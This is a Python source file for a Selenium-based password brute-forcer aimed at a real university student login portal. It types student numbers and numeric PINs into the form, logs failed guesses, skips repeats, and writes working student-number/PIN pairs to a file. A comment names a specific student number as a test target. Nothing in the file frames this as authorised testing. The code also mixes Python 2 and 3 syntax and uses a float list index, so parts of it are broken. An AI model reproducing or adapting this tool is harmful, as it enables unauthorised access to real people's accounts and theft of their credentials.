import time
from selenium import webdriver

from Filer import Filer
from Sorter import Sorter


class PasswordTester:
    def __init__(self):
        self.driver = None
        self.tried = 'tried.txt'
        self.sort()

    def recordTriedPassword(self, password):
        """records a password that has been tried and failed, also appends nelne"""
        Filer.appendItemToFile(password, self.tried)

    def checkIfPasswordTried(self, password, lst):
        """Checks if the particular password had been tried already"""
        # this implementation is inefficient for now since i doubt the tried keys will be in alphabetic order
        if lst is None:
            with open('tried.txt') as f:
                lst = f.readlines()
            # you may also want to remove whitespace characters like `\n` at the end of each line
            lst = [x.strip() for x in lst]

        # if len(lst) > 1:
            # print "Checking from list starting with " + str(lst[0]) + " Containing " + str(len(lst)) + " Items"

        low = 0
        high = len(lst) - 1

        while low <= high:
            mid = (low + high) / 2
            guess = int(lst[mid])
            if guess == password:
                print ("Found tried password " + str(password) + " as " + str(guess))
                return True
            if guess > password:
                high = mid - 1
            else:
                low = mid + 1
        # print "Did not find " + str(password) + " In list of tried"
        return False

    def testPassword(self, student_number, password):
        try:
            if self.driver is None:
                self.driver = webdriver.Chrome()

            self.driver.get("http://its.mak.ac.ug/pls/prod/w99pkg.mi_login")
            student_number_element = self.driver.find_element_by_name("unum")
            password_element = self.driver.find_element_by_name("pin")
            student_number_element.send_keys(student_number)  # test with 211002958 Some random person
            password_element.send_keys(password)
            login = self.driver.find_element_by_xpath("//img[@alt='Click Here To Login']")
            login.click()

            if self.driver.title != "Illegal Login":
                return True
            else:
                print("Code " + str(password) + " did not work")
                self.recordTriedPassword(password)
                return False

        except TypeError as argument:
            print(argument)

    def confirmPasswordWorked(self, student_number, password):
        time.sleep(5)
        return self.testPassword(student_number, password)

    def saveWorkedPassword(self, student_number, password):
        print "Code " + str(password) + " worked"

        with open('worked.txt', 'a') as f:
            text = "Student Number: " + str(student_number) + " Password: " + str(password) + "\n"
            f.write(text)

    def back(self):
        self.driver.back()

    def sort(self):
        unsorted_items = Filer.readItemsFromFileToList('tried.txt')
        sorted_items = Sorter.selectionSort(unsorted_items)
        Filer.writeItemsToFile(sorted_items, 'tried.txt')

    def cleanUp(self):
        self.__del__()

    def __del__(self):
        if self.driver is not None:
            self.driver.close()
